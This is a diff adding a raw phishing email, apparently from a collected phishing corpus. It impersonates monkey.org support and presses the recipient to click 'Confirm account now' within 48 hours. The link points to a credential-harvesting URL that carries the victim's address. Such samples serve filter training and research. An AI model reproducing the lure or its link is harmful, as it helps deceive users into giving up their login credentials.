@@ -1,0 +1,113 @@
+From jose@monkey.org Wed Mar 29 17:08:17 2023 +0000
+Return-Path: office1@anhphongco.com
+Delivered-To: jose@monkey.org
+X-FDA: 80622568992.23.E754FA6
+Received: from vertex.coinbasehelp.org (unknown [51.79.185.227])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id A2DE816021A
+	for <jose@monkey.org>; Wed, 29 Mar 2023 17:04:20 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf08.b.hostedemail.com: 51.79.185.227 is neither permitted nor denied by domain of office1@anhphongco.com) smtp.mailfrom=office1@anhphongco.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1680109463; a=rsa-sha256;
+	cv=none;
+	b=QWbMZl+XMa3pbr9CpOg0h50INeGWMyPUqqzGTQFmzsdxizoleg9zQ4oJcv/RMfQRIxar5X
+	Oua7xcayp6zogduQ+o3CLdovzROsDrAhOAMGZR2sAhDTZAoUVE8Hp76dSlR4YRHwn0UFol
+	pCDPkgAegDAxEAKeeyqG1Da3tYQ9vCY=
+ARC-Authentication-Results: i=1;
+	imf08.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf08.b.hostedemail.com: 51.79.185.227 is neither permitted nor denied by domain of office1@anhphongco.com) smtp.mailfrom=office1@anhphongco.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1680109463;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=jKKWfrdtRqLwYN49ifxyVJWI0iCIYbbFXmb5vcVMsPc=;
+	b=3jBEWpj/Q91NxubAf5dWDg0QFxBvSqzpzJps3qwdOHLMuh/r+7QVZiRVatdceYhXZzLLJs
+	20RL0lve29SMJL1QzDKZCzuALZbYeO01G6h1UMSXYxbvvvR7k9LbDWNzfl2os94FdfcTYI
+	bzhqelBt3Nr6qxLKkwLk5Zr5mj55dbM=
+Received: from anhphongco.com (unknown [46.183.221.21])
+	by vertex.coinbasehelp.org (Postfix) with ESMTPA id 6351C11EBF7
+	for <jose@monkey.org>; Sat, 25 Mar 2023 05:12:33 +0000 (UTC)
+From: monkey.org<office1@anhphongco.com>
+To: jose@monkey.org
+Subject: (5) QUOTATIONS 
+Date: 25 Mar 2023 07:12:51 +0200
+Message-ID: <20230325071251.000FF5A193EDD73D@anhphongco.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: A2DE816021A
+X-Rspam-User: 
+X-Spam-Status: Yes, score=17.54
+X-Stat-Signature: rtie7kjwbw4t574rcdznano5pd1pukgz
+X-HE-Tag: 1680109460-62487
+X-HE-Meta: U2FsdGVkX18/o1z87Eqlku0YEIiPC4/WQU2eu8KmcedhZJOde/26exiC75kwcptGpVBMfaawXP6gwF5SHcOhbmCdVWtJU8FsZMXylJinLODWOL9q2LoRKeP0sadZp6fIA5Rocxv0nlnIX1gtX6nChyXH/RfScgoPoDHh+i4V8lP+FY43QMPec4foeHroTP0NVeqVnGsYmqxdVktOiGWe4mmX5h+IY3eSbeRzy3lsF02lIH8xL1qzMDi549GpWGDJ
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 62
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"margin: 0.5em;">
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; font-variant-ligatures: normal; font-variant-caps: normal; text-=
+decoration-style: initial; text-decoration-color: initial;">Dear jose,</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; font-variant-ligatures: normal; font-variant-caps: normal; text-=
+decoration-style: initial; text-decoration-color: initial;">You have pendin=
+g quotations,please confirm your account below to receive</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Helvetica,Arial,sans-serif; font-size=
+: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; font-variant-ligatures: normal; font-variant-caps: normal; text-=
+decoration-style: initial; text-decoration-color: initial;">
+<a style=3D"padding: 10px; width: 20px; color: white; background-color: rgb=
+(70, 139, 252); text-decoration-line: none;" href=3D"https://webmaill.carts=
+=2Ebest/connectivities.asp?new=3Djose@monkey.org" target=3D"_blank" rel=3D"=
+noopener">Confirm account now</a>
+</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; padding-top: 10px; font-family: Helvetica,Arial,sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; font-variant-ligatures: normal; font-variant-=
+caps: normal; text-decoration-style: initial; text-decoration-color: initia=
+l;"><b>Note:</b>
+&nbsp;<span class=3D"m_6856472335812846183m_3820340594843442798m_6589912474=
+636781849m_3330722352754382493m_834092019121044752gmail-m_-4180957621435196=
+190m_-6441671359383383640gmail-m_1727417406526550362gmail-clickable m_68564=
+72335812846183m_3820340594843442798m_6589912474636781849m_33307223527543824=
+93m_834092019121044752gmail-m_-4180957621435196190m_-6441671359383383640gma=
+il-m_1727417406526550362gmail-ClickableEmail=20
+&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;m_68564723=
+35812846183m_3820340594843442798m_6589912474636781849m_3330722352754382493m=
+_834092019121044752gmail-m_-4180957621435196190m_-6441671359383383640gmail-=
+m_1727417406526550362gmail-inactive" style=3D"border-width: 0px 0px 1px; bo=
+rder-style: dotted; border-color: rgb(51, 51, 51);"><a href=3D"jose@monkey.=
+org" target=3D"_blank">jose@monkey.org</a></span>&nbsp;will be restricted i=
+n 48 hours&nbsp;failure to confirm your&nbsp;account</p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; padding-top: 10px; font-family: Helvetica,Arial,sa=
+ns-serif; font-size: 12px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; white-space: normal; font-variant-ligatures: normal; font-variant-=
+caps: normal; text-decoration-style: initial; text-decoration-color: initia=
+l;">Regards<br><b><a href=3D"http://monkey.org/" target=3D"_blank">monkey.o=
+rg</a> support Team</b></p></div><p>
+</p>
+
+
+</body></html>
